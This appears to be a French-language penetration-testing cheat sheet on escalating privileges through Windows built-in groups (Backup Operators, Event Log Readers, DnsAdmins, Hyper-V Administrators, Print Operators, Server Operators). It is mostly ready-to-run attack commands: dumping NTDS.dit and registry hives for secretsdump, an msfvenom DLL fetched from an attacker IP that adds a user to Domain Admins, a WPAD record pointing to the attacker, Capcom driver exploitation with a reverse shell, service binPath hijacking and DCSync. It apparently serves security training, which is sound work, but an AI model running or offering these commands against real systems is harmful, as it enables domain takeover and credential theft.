
 - [ ] [[#Backup Operators]]
 - [ ] [[#Event Log Readers]]
 - [ ] [[#DnsAdmin]]
 - [ ] [[#Hyper-V Administrator]]
 - [ ] [[#Print Operators]]
 - [ ] [[#Server Operators]]



```powershell
whoami /groups
```


---
# Backup Operators

Les membres de ce groupe ont les privilèges SeBackup et SeRestore

> [!TIP]
> Permet de copier n'importe quel dossier / fichier pour le lire

## PoC

https://github.com/giuliano108/SeBackupPrivilege

Importer les libs

```powershell
 Import-Module .\SeBackupPrivilegeUtils.dll
```

```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Activer le privilège SeBackup

```powershell
Set-SeBackupPrivilege
```

Vérifier que le privilège est actif

```powershell
Get-SeBackupPrivilege
```

```powershell-session
whoami /priv
```

Copier le fichier cible

```powershell-session
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

### Copie de NTDS.dit

#### 1. Créer shadow copie du disque C:

Diskshadow (natif)

```powershell-session
diskshadow.exe
```

```powershell-session
set verbose on
```

```powershell-session
set metadata C:\Windows\Temp\meta.cab
```

```powershell-session
set context clientaccessible
```

```powershell-session
set context persistent
```

```powershell-session
begin backup
```

```powershell-session
add volume C: alias cdrive
```

```powershell-session
create
```

```powershell-session
expose %cdrive% E:
```

```powershell-session
end backup
```

```powershell-session
exit
```

```powershell-session
dir E:
```

#### 2. Copier NTDS.dit

```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

ou avec Robocopy

```cmd-session
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

#### 3. Copie des ruches SYSTEM, SECURITY & SAM

```cmd-session
reg save HKLM\SYSTEM SYSTEM.SAV
```

```cmd-session
reg save HKLM\SAM SECURITY.SAV
```

```cmd-session
reg save HKLM\SAM SAM.SAV
```


#### 4. Extraction des hash

#### Impacket-secretsdump

```
sudo impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```


---
# Event Log Readers

> [!TIP]
> Permet de lire les logs -> Rechercher des identifiants en clair dans les logs !


```cmd
net localgroup "Event Log Readers"
```


## Wevtutil

Rechercher dans les logs Security le string /user en local

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Rechercher dans les logs Security le string /user sur un ordinateur distant avec des identifiants

```cmd
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```


## Get-WinEvent


> [!TIP]
> Necessite les droits d'admin ou droits spécifiques sur la clé de registre HKLM\System\CurrentControlSet\Services\Eventlog\Security

Rechercher des creds dans les logs de création de processus (id 4688)

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} -Credential $creds
```

Rechercher les logs powershell egalement (id 4104)
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.5&viewFallbackFrom=powershell-7.1


---
# DnsAdmin

> [!TIP]
> Permet de lire les infos DNS sur le réseau.
> Service DNS lancé en tant que SYSTEM.
> - When a member of the `DnsAdmins` group runs the `dnscmd` command, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated

- [ ] [[#1. DLL Hijacking (Vérifier avec le client avant pour les répercutions)]]
- [ ] [[#2. WPAD Record]]

## 1. DLL Hijacking (Vérifier avec le client avant pour les répercutions)

### DNSCMD

#### 1. Créer charge (adduser to domain admins)

```shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
```

#### 2. transférer la charge

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

#### 3.  Charger la dll (le full path de la dll doit être indiqué)

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

#### 4. Identifier le SID de l'utilisateur

```cmd
wmic useraccount where name="netadm" get sid
```

#### 5. Vérifier les permissions sur le service DNS

```cmd
sc.exe sdshow DNS
```

[[SDDL Syntax]]


#### 6. Stopper et relancer le service DNS

```cmd-session
sc stop dns
```

```cmd-session
sc start dns
```

```cmd-session
sc query dns
```

#### 7. Confirmer l'ajout de l'utilisateur au groupe "Admin du domaine"

```cmd
net group "Domain Admins" /dom
```

#### 8. Se deco / reco de la session ou Runas pour charger les droits

Runas pour recharger la session avec les droits

```
runas /netonly /user:server_adm "cmd.exe"
```

#### **Nettoyage (session as admin)**

#### 9. Vérifier la présence de la dll en clé de registre

```cmd
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

#### 10. Supprimer la clé de registre correpsondante

```cmd-
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

#### 11. Stopper et relancer le service DNS

```cmd-session
sc stop dns
```

```cmd-session
sc start dns
```

```cmd-session
sc query dns
```

### Mimilib

https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html


## 2. WPAD Record

> [!tip]
> Permet de désactiver le Global Query Block Security.
> Capturer ensuite les hash avec responder / inveigh

####  Désactiver le Global Query Block List

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

#### Ajouter le WPAD Record pointant vers notre addresse

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address <ip_attacker>
```




---
# Hyper-V Administrator

> [!TIP]
> Admin hyper-V.
> Permet de monter un clone du DC et récupérer NTDS.dit par exemple


## Hard Links (Pre 2020)

> [!TIP]
> A tester sur n'importe quel service qui s'exécute en tant que system

https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1

### Mozilla Maintenance Service

Modifier l'exploit pour avoir le controle total sur ce fichier > C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

Take ownership du fichier

```cmd-
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

Lancer le service qui s'exécute en tant que SYSTEM

```cmd
sc.exe start MozillaMaintenance
```



---
# Print Operators

> [!TIP]
> Permet d'avoir le SeLoadDriverPrivilege et donc de gérer, créer, partager et supprimer des imprimantes sur un DC


```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

```powershell
whoami /priv
```


- [ ] [[#EnableSeLoadDriverPrivilege (GUI)]]
- [ ] [[#EnableSeLoadDriverPrivilege (NO-GUI)]]
- [ ] [[#Automatiser l'activation du privilege et tout ce qui s'en suit]]
- [ ] [[#Supprimer la clé de registre]]

## EnableSeLoadDriverPrivilege (GUI)

https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

### 1. Télécharger le cpp -> https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

### 2. Editer le code et ajouter les lignes suivantes

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

### 3. Le compiler depuis Visual Studio

```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

### 4. Télécharger https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys et l'enregistrer dans C:\Temp


### 5. Référencer le driver sous HKCU\System\CurrentControlSet\CAPCOM

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Temp\Capcom.sys"
```

### 6. Vérifier que le driver n'est pas chargé

https://www.nirsoft.net/utils/driverview.html

```powershell
.\DriverView.exe /stext drivers.txt
```

```powershell
cat drivers.txt | Select-String -pattern Capcom
```

### 7. Vérifier que le privilège est activé 

```cmd
.\EnableSeLoadDriverPrivilege.exe
```

### 8. Vérifier que le driver Capcom est bien chargé

```powershell
.\DriverView.exe /stext drivers.txt
```

```powershell
cat drivers.txt | Select-String -pattern Capcom
```

### 9. Compiler ExploitCapcom

https://github.com/tandasat/ExploitCapcom

### 10. Lancer l'Exploit

```powershell
.\ExploitCapcom.exe
```

## EnableSeLoadDriverPrivilege (NO-GUI)

https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

### 1. Télécharger le cpp -> https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

### 2. Editer le code et ajouter les lignes suivantes

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Ligne 292 -> remplacer  

```c
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```

Par

```c
    TCHAR CommandLine[] = TEXT("C:\\Windows\\Temp\\revshell.exe");
```

puis créer une charge avec [[SHELLS#MSFVENOM|MSFVENOM]] par exemple

### 3. Le compiler depuis Visual Studio

```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

### 4. Télécharger https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys et l'enregistrer dans C:\Temp


### 5. Référencer le driver sous HKCU\System\CurrentControlSet\CAPCOM

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Temp\Capcom.sys"
```

### 6. Vérifier que le driver n'est pas chargé

https://www.nirsoft.net/utils/driverview.html

```powershell
.\DriverView.exe /stext drivers.txt
```

```powershell
cat drivers.txt | Select-String -pattern Capcom
```

### 7. Vérifier que le privilège est activé 

```cmd
EnableSeLoadDriverPrivilege.exe
```

### 8. Vérifier que le driver Capcom est bien chargé

```powershell
.\DriverView.exe /stext drivers.txt
```

```powershell
cat drivers.txt | Select-String -pattern Capcom
```

### 9. Compiler ExploitCapcom

https://github.com/tandasat/ExploitCapcom

### 10. Lancer l'Exploit

```powershell
.\ExploitCapcom.exe
```


## Automatiser l'activation du privilege et tout ce qui s'en suit

https://github.com/TarlogicSecurity/EoPLoadDriver/

### 1. Activer le privilège, créer la clé de registre et charger le driver

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

### 2. Compiler ExploitCapcom

https://github.com/tandasat/ExploitCapcom

### 3. Lancer l'Exploit

```powershell
.\ExploitCapcom.exe
```


## Supprimer la clé de registre

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```



---

# Server Operators


> [!TIP]
> Les membres de ce groupe ont les droits  `SeBackupPrivilege` et `SeRestorePrivilege`

```
whoami /groups
```

```
wwhoami /priv
```


### 1. Vérifier que le service AppReadinesss se lance en tant que SYSTEM

```cmd
sc qc AppReadiness
```

## PSService (Sysinternals)

https://learn.microsoft.com/en-us/sysinternals/downloads/psservice

### 2. Verifier les permissions sur le service

```cmd-session
c:\Tools\PsService.exe security AppReadiness
```

### 3. Vérifier les membres du groupe Administrateur Local

```cmd
 net localgroup Administrators
```

### 4. Modifier le service Binary Path

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

### 5. Lancer le service

Erreur normal puisque le path est erroné

```cmd-session
sc start AppReadiness
```


### 6. Confirmer l'ajout au groupe Administrateur local

```cmd-session
net localgroup Administrators
```

Runas pour recharger la session avec les droits

```
runas /netonly /user:server_adm "cmd.exe"
```


### 7. DCSync avec Impacket

```shell
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

